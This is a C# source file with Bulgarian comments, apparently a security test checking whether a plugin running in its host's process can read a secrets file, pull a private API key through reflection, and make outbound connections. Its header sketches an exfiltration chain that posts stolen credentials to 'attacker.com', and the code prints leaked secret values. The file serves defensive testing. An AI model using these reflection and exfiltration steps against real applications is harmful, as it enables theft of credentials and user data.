
using System.Reflection;

/// Какво представлява:
/// Plugin има достъп до паметта, файловата система и ресурсите на host процеса
/// и може да извлече (exfiltrate) credentials, API keys, connection strings или
/// потребителски данни към external server.
/// 
/// Предпоставки:
/// - Plugin и Host работят в един процес (shared memory space)
/// - Host държи secrets в паметта (passwords, tokens, API keys)
/// - Липса на memory protection/encryption за sensitive data
/// - Plugin има network access (HttpClient, Socket)
/// - Няма outbound network filtering или monitoring
/// - Shared AppDomain - plugin вижда host's static/private members
/// 
/// Концептуален пример:
/// 1. Host съхранява: dbConnectionString = "Server=prod;User=sa;Password=Secret123"
/// 2. Plugin използва reflection за достъп до private field
/// 3. Plugin прочита: File.ReadAllText(@"secrets\secret.txt")
/// 4. Plugin изпраща данните: HttpClient.Post("http://attacker.com", stolenData)
/// 5. Атакуващ получава credentials и може да атакува database-а
/// 
/// Въздействие:
/// - Компрометиране на database credentials
/// - Изтичане на API keys → lateral attacks на други services
/// - Достъп до PII (Personally Identifiable Information)
/// - Intellectual property theft (алгоритми, бизнес логика)
/// - GDPR, PCI-DSS compliance violations

class Risk4_DataLeakage
{
    public static bool DetectSecretsFileAccess(string secretsPath)
    {
        Console.WriteLine($"\n--- ТЕСТ: Опит за достъп до '{secretsPath}' ---");

        try
        {
            if (!File.Exists(secretsPath))
            {
                Console.WriteLine($"[INFO] Secrets файлът не съществува");
                return false;
            }

            string content = File.ReadAllText(secretsPath);

            Console.WriteLine($"[РИСК КРИТИЧЕН] Plugin може да прочете secrets файла!");
            Console.WriteLine($"  Съдържание (първи 50 символа): {content.Substring(0, Math.Min(50, content.Length))}...");
            return true;
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine($"[OK] Достъпът до secrets файла е отказан");
            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ГРЕШКА] {ex.Message}");
            return false;
        }
    }

    public static bool DetectReflectionAttack()
    {
        Console.WriteLine("\n--- ТЕСТ: Reflection attack на host process ---");

        try
        {
            var hostType = typeof(SimulatedHost);

            var field = hostType.GetField("_apiKey",
                BindingFlags.NonPublic | BindingFlags.Static);

            if (field != null)
            {
                var secretValue = field.GetValue(null);
                Console.WriteLine($"[РИСК КРИТИЧЕН] Plugin може да извлече secrets чрез reflection!");
                Console.WriteLine($"  Извлечена стойност: {secretValue}");
                return true;
            }

            Console.WriteLine("[OK] Reflection attack не успя");
            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[OK] Reflection е блокиран: {ex.Message}");
            return false;
        }
    }

    public static bool DetectNetworkAccess()
    {
        Console.WriteLine("\n--- ТЕСТ: Network access за exfiltration ---");

        try
        {
            using (var client = new System.Net.Http.HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(5);

                var task = client.GetStringAsync("http://127.0.0.1:9999/exfiltrate");
                task.Wait(5000);

                Console.WriteLine("[РИСК] Plugin има network access! Може да exfiltrate данни!");
                return true;
            }
        }
        catch (AggregateException)
        {
            Console.WriteLine("[РИСК] Plugin може да прави outbound connections!");
            Console.WriteLine("       В production среда това позволява exfiltration!");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[OK] Network access е блокиран: {ex.Message}");
            return false;
        }
    }

    private class SimulatedHost
    {
        private static string _apiKey = "sk-prod-secret-xyz123456789";
        private static string _dbPassword = "SuperSecretPassword!123";
    }

    // Comprehensive test
    public static void RunAllDataLeakageTests()
    {
        bool hasRisk = false;

        hasRisk |= DetectSecretsFileAccess(@"secrets\secret.txt");

        hasRisk |= DetectReflectionAttack();

        hasRisk |= DetectNetworkAccess();

        if (hasRisk)
        {
            Console.WriteLine("\n[ЗАКЛЮЧЕНИЕ] Открити са уязвимости за data leakage!");
        }
        else
        {
            Console.WriteLine("\n[ЗАКЛЮЧЕНИЕ] Системата е защитена срещу data leakage");
        }
    }
}